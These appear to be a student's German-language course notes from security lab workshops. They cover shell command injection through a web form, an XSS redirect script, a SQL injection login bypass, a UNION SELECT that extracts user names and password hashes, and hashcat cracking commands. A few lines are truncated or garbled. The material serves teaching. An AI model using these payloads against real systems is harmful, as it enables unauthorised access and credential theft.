tag:: [[GIBB]] 
module:: 183

- [[Injection]]
- [[Brute Force]], [[Dictionary Attack]], [[Hashing]], [[Hashcat]]
-
- ## Workshop 1 - Injection über Web
  collapsed:: true
	- #### Shell Injection
		- Über das Web Formular auf die Shells des Servers gelangen. Mit `;` escapen, dann z.B. `ls -l`
		- Prozesse und Ihre Besitzer auslesen: `ps aux | grep website`
		- Welche Crontabs hat der User?: `crontab -l`
		- Wie sieht der Sourcecode der Webseite aus: `cat website.p1`
		- Mit was für eine Sprache (Version) wird die Seite ausgeführt: `perl --version`
	- ### XSS Injection
		- JS zum Umleiten auf GIBB Webseite
		- ```javascript
		  <script language="javascript" type="text/javascript">
		  	window.setTimeout('window.location = "https://portal.gibb.ch"',20000);
		  </script>
		  
		  ;sed -i "s/willkommen!/Her will"
		  ```
-
- ## Workshop 2 - Injection über TCP
	- #### Login ohne Credentials
		- ```bash
		  $ ziu login
		  User: ' or 1=1; # 
		  Password: *
		  ```
		- Die SQL-Injection sollte beim **Usernamen** eingegeben werden, weil die Abfrage meist zuerst nach dem Benutzernamen sucht. So kann der Angreifer die Passwortprüfung umgehen.
		- Da `1=1` immer **wahr** ist, wird die Abfrage für alle Benutzer gültig – der Angreifer kann sich ohne Passwort einloggen!
		- Gebe ein beliebiges Passwort von mindestens der Länge 1 an, damit die TCP-Nachricht das korrekte Format hat und vom Server akzeptiert wird.
	- #### Credentials auslesen
		- `ziu artikel "aaaa' union select name, pw_hash, '', '' from user; #"`
		- **Was bewirkt der String aaaa?**
			- `aaaa` ist einfach ein Platzhalter, um die ursprüngliche SQL-Abfrage nicht komplett zu verändern. Es wird eine normale Abfrage nach einem Artikel mit dem Namen `aaaa` vorgetäuscht.
		- **Was macht ein union select?**
			- `UNION SELECT` erlaubt es, eine zweite Abfrage an das ursprüngliche Ergebnis anzuhängen.
			- Das bedeutet, dass wir zusätzlich zur ursprünglichen Tabelle **Daten aus einer anderen Tabelle** (hier `user`) abrufen können.
			- Damit der `UNION`-Angriff funktioniert, muss die Anzahl der Spalten übereinstimmen.
		- **Warum hat es zwei Leerstrings (' ') im Angriff?**
			- Die Original-Abfrage könnte eine Tabelle (`artikel`) mit vier Spalten haben.
			- Die `user`-Tabelle hat aber nur zwei relevante Spalten (`name` und `pw_hash`).
			- Damit der `UNION SELECT` funktioniert, müssen wir zwei leere Werte (`''`) hinzufügen, damit die Spaltenanzahl passt.
		- **Was erhalten Sie als Ergebnis?**
			- Falls die SQL-Injection erfolgreich ist, gibt die Datenbank eine Liste mit Artikeln **und zusätzlich die Benutzerdaten**(Name und Passwort-Hash) aus der `user`-Tabelle zurück.
			- Anstatt nur Artikel anzuzeigen, werden also auch **gehackte Usernamen und Passwort-Hashes** sichtbar!
			- ![Screenshot 2025-02-04 at 09.28.40.png](../assets/Screenshot_2025-02-04_at_09.28.40_1738657724348_0.png){:height 86, :width 656}
	- #### Server weiter ausforschen über Shell-Injection
	- #### Remote Shell aktivieren
	- #### Daten Verändern
-
- ## Worshop 3
	- hashcat --show -m 0 root.txt
	- echo -n "abc" | md5s
	- ### Passwörter aus Listen wiederherstellen
		- `md5_4_smallletters.txt`
			- ```bash
			  hashcat -m 0 -a 3 md5_4_smallletters.txt ?l?l?l?l --force
			  hashcat --show -m 0 md5_4_smallletters.txt
			  ```
		- `md5_6_smallletters.txt`
			- ```bash
			  hashcat -m 0 -a 3 md5_6_smallletters.txt ?l?l?l?l?l?l --force
			  hashcat --show -m 0 md5_6_smallletters.txt
			  ```
		- `md_4_AlphaNum.txt`
			- ```bash
			  hashcat -m 0 -a 3 md_4_AlphaNum.txt ?a?a?a?a --force
			  hashcat --show -m 0 md_4_AlphaNum.txt
			  ```
		- `md_4_germanset.txt`
			- ```bash
			  hashcat -m 0 -a 3 
			  	--custom-charset1=aäöüÄÖÜßbcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 
			      md5_4_germanset.txt ?1?1?1?1 
			      --force
			  ```
			- `--custom-charset1=` → Defines a custom charset
			- `?1?1?1?1` → Tries **4-character passwords** from the custom charset
		- `md5_8_AlphaNum.txt` with **Dictionary Attack**
			- ```bash
			  hashcat -m 0 -a 0 md5_8_AlphaNum.txt rockyou.txt --force
			  ```
		- `md5_8_smallletters`
			- ```bash
			  hashcat -m 0 -a 0 md5_8_smallletters.txt rockyou.txt --force
			  ```
		-